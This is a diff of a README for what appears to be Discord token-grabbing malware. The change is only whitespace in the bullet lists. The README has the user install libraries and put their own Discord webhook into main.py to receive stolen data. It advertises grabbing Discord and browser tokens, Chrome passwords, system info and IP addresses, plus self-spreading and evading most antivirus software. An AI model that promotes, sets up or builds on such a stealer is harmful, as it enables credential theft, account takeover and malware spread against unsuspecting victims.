@@ -9,18 +9,18 @@
 
 ## Installation
 ```
-  *pip install numpy requests discord opencv-python pyautogui discord_webhookedit main.py
-  *replace <Webhook Here> to ur webhook
-  *you can change Embed_T and Embed_C 
+  * pip install numpy requests discord opencv-python pyautogui discord_webhookedit main.py
+  * replace <Webhook Here> to ur webhook
+  * you can change Embed_T and Embed_C 
 ```
 
 ##  Features:
 ```js
-  *Grabbing Discord/ptb/canary/Opera/Google/Yandex/Brave
-  *Undetected By 90% of All AV
-  *Chrome Pass Grab
-  *Sys Info Grab
-  *Self Spread
-  *Ip Grabber
-  *Fast
+  * Grabbing Discord/ptb/canary/Opera/Google/Yandex/Brave
+  * Undetected By 90% of All AV
+  * Chrome Pass Grab
+  * Sys Info Grab
+  * Self Spread
+  * Ip Grabber
+  * Fast
 ```
